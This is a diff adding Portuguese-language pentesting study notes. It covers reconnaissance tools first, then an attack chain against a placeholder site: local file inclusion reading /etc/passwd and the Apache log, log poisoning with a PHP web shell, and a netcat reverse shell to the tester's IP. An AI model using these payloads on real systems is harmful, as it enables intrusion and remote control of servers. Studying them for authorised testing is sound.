@@ -1,0 +1,53 @@
+FASE 1 - RECONHECIMENTO
+
+1) PREPARAÇAO DO TERRENO
+    -> criar pasta do pentesting
+    -> criar um bloco de notas dentro para registrar as informações (tudo deve ser registrado aqui)
+
+2) COLETAR O IP
+    -> ping site.com // ping -c1 site.com (caso queira q mande só um pacote)
+
+3) COLETAR MAIS IPs
+    -> whois 000.000.000.000 (IP coletado na fase 2)
+    -> vai retornar o netrange do domínio (todos os IPs que atuam nele)
+
+4) INFORMAÇOES DNS
+    -> fierce -dns site.com
+    -> vai ter mais ips que podem ser testados no whois
+
+5) MAIS BRUTEFORCE DNS PARA DESCOBRIR OUTROS POSSÍVEIS SUBDOMINIOS
+    -> usar ferramentas próprias com wordlist
+
+6) USAR GOOGLE HACKING
+    -> site:site.com
+
+7) DIRB NO SITE
+    -> dirb http://site.com
+=> PARA QUE ESSA COLETA?
+    -> Os IPs podemos verificar se tem alguma porta aberta ou serviço ativo
+    -> explorar as URLs
+sqlinjection
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+FASE 2 - TESTES NA APLICAÇÃO
+
+1) TESTE NA URL (LFI)
+
+    -> site.com/index.php?page=2
+        -> /index.php?page=/../../etc/passwd%00
+        -> /index.php?page=/../../var/log/apache2/access.log%00
+            -> pasta que guarda todas as tentativas/solicitacoes de acesso do servidor apache
+            -> se esse tipo de informação é acessível, então podemos enviar um pacote de dados para o sistema, sendo um payload malicioso de shell reverso
+
+    -> nc -v site.com 80
+        -> envia: <?php system($_GET['xpl']);?>
+        -> Agora da reload na pagina e vai estar uma mensagem de "cannot execute a blank command" já que passamos um system vazio
+    
+    -> /index.php?xpl=comando-que-quero&page=/../../var/log/apache2/access.log%00
+        -> agora o "comando-que-quero" será rodado (portanto, é possível, até mesmo, realizar o shell reverso)
+            -> nc -vnlp 443 (meu terminal)
+            -> xpl=nc <ip> 443 -e /bin/bash&page=........
+             
+
+
+172.64.0.0 - 172.71.255.255
